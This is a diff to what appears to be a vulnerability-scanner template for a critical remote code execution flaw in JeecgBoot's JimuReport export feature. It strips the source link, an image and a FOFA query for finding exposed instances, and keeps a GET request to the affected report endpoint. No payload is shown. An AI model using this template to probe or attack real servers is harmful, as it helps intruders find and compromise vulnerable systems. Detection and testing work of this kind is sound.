@@ -3,12 +3,8 @@ info:
   name: JeecgBoot 积木报表auto export存在远程代码执行漏洞(XVE-2026-53510)
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lahzkchq5lhcub8t'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lahzkchq5lhcub8t
-    fofa: app="JeecgBoot-企业级低代码平台"
 http:
 - raw:
   - 'GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10 HTTP/1.1
@@ -17,7 +13,6 @@ http:
 
     Accept: application/json
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788182728658-e09b1134-79e2-45ec-a4aa-fa234a33a206.png)
 
     导出报表代码执行'
   redirects: false
